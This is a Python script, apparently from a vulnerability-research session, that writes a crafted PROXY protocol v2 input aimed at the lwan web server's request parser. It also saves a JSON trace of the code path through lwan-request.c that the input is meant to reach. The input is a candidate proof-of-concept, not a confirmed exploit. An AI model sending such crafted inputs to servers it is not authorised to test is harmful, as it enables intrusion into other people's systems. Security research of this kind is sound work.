from pathlib import Path
# Build a candidate using LOCAL command variant and minimal tail to try a different control flow.
sig=bytes.fromhex('0d0a0d0a000d0a515549540a')
# cmd_ver = 0x20 (LOCAL), fam = 0x00, len = 0
# This should skip address copy but still advance and set proxied.
data=sig+bytes([0x20,0x00])+ (0).to_bytes(2,'big') + b'GET / HTTP/1.1\r\nHost: x\r\n\r\n'
Path('/workspace/poc_local.bin').write_bytes(data)
trace=[
{"step":1,"file":"src/lib/lwan-request.c","function":"fuzz_parse_http_request","line":1624,"var":"request.flags","code":".flags = REQUEST_ALLOW_PROXY_REQS","note":"The harness always enables proxy parsing, allowing the attacker-controlled prefix to be treated as PROXY protocol data."},
{"step":2,"file":"src/lib/lwan-request.c","function":"read_request_finalizer","line":888,"var":"helper->buffer->len","code":"char *crlfcrlf = memmem(helper->buffer->value, helper->buffer->len, \"\\r\\n\\r\\n\", 4);","note":"The payload contains a complete HTTP request tail so the finalizer passes it to the parser."},
{"step":3,"file":"src/lib/lwan-request.c","function":"parse_http_request","line":1170,"var":"request->flags","code":"if (request->flags & REQUEST_ALLOW_PROXY_REQS) { buffer = parse_proxy_protocol(request, buffer); }","note":"The parser dispatches into the PROXY v2 handler before ordinary HTTP method parsing."},
{"step":4,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":223,"var":"hdr","code":"struct proxy_header_v2 *hdr = (struct proxy_header_v2 *)buffer;","note":"The raw input is interpreted as a PROXY v2 header with attacker-chosen command and family bytes."},
{"step":5,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":233,"var":"size","code":"size = proto_signature_length + (unsigned int)ntohs(hdr->len); if (UNLIKELY(size > (unsigned int)sizeof(*hdr))) return NULL;","note":"A zero-length LOCAL frame passes the size check and exercises the alternate command branch."},
{"step":6,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":258,"var":"request->flags","code":"request->flags |= REQUEST_PROXIED;","note":"The request is marked proxied even in the LOCAL branch, changing how the rest of request parsing treats the input."},
{"step":7,"file":"src/lib/lwan-request.c","function":"parse_http_request","line":1176,"var":"buffer","code":"buffer = ignore_leading_whitespace(buffer);","note":"HTTP parsing resumes immediately after the PROXY header, so any hidden boundary bug in the prefix would now be visible in the HTTP tail."}
]
Path('/workspace/candidate_trace.json').write_text(__import__('json').dumps(trace, indent=2))
print('/workspace/poc_local.bin')
